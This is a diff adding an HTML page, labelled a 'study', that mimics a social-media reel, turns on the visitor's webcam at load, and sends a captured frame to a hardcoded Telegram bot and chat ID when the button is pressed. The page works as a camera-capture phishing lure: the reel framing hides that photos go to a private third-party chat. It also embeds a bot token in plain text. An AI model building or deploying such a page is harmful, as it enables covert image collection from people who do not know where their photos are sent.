@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Study: Ethical Automation Bot</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .reel-frame { width: 350px; height: 600px; position: relative; overflow: hidden; border-radius: 30px; background: #000; }
+        #camera-feed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .ui-layer { position: absolute; inset: 0; z-index: 10; display: flex; flex-direction: column; justify-content: flex-end; padding: 20px; background: linear-gradient(transparent, rgba(0,0,0,0.7)); }
+    </style>
+</head>
+<body class="bg-gray-100 flex flex-col items-center justify-center min-h-screen p-4">
+
+    <div class="reel-frame shadow-2xl border-8 border-gray-800">
+        <video id="camera-feed" autoplay playsinline muted></video>
+        
+        <div class="ui-layer">
+            <h2 class="text-white font-bold text-lg mb-1">@dev_study_bot</h2>
+            <p class="text-white/80 text-xs mb-6">Click below to test automated Telegram sending.</p>
+            
+            <button id="upload-btn" class="bg-gradient-to-r from-purple-500 to-pink-500 text-white font-bold py-3 rounded-xl active:scale-95 transition">
+                🚀 Post Reaction to Telegram
+            </button>
+            
+            <div id="status" class="text-white text-[10px] mt-4 text-center opacity-0 transition-opacity">
+                Sending to Bot...
+            </div>
+        </div>
+    </div>
+
+    <canvas id="capture-canvas" class="hidden"></canvas>
+
+    <script>
+        // CONFIG (For Study Only)
+        const BOT_TOKEN = "8737278215:AAGAEu_vRvnv1bc-kEcX0qQ7eLlkeCb_RuU";
+        const CHAT_ID = "2018747103";
+
+        const video = document.getElementById('camera-feed');
+        const uploadBtn = document.getElementById('upload-btn');
+        const status = document.getElementById('status');
+        const canvas = document.getElementById('capture-canvas');
+
+        // Start Camera on Load (User will see the browser permission popup)
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+            } catch (e) {
+                alert("Camera access is required for this automation study.");
+            }
+        }
+
+        // Logic for Automated Sending (Triggered by User)
+        uploadBtn.onclick = async () => {
+            status.style.opacity = "1";
+            uploadBtn.disabled = true;
+
+            // 1. Capture current frame to Canvas
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            // 2. Convert to Blob (Image data)
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'reaction.jpg');
+                formData.append('caption', "✅ User-triggered upload test from Web UI.");
+
+                try {
+                    // 3. Send to Telegram API
+                    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (resp.ok) {
+                        status.innerText = "✅ Successfully Sent!";
+                        setTimeout(() => { status.style.opacity = "0"; uploadBtn.disabled = false; }, 2000);
+                    }
+                } catch (err) {
+                    status.innerText = "❌ Error: Check Console";
+                    console.error(err);
+                }
+            }, 'image/jpeg');
+        };
+
+        initCamera();
+    </script>
+</body>
+</html>
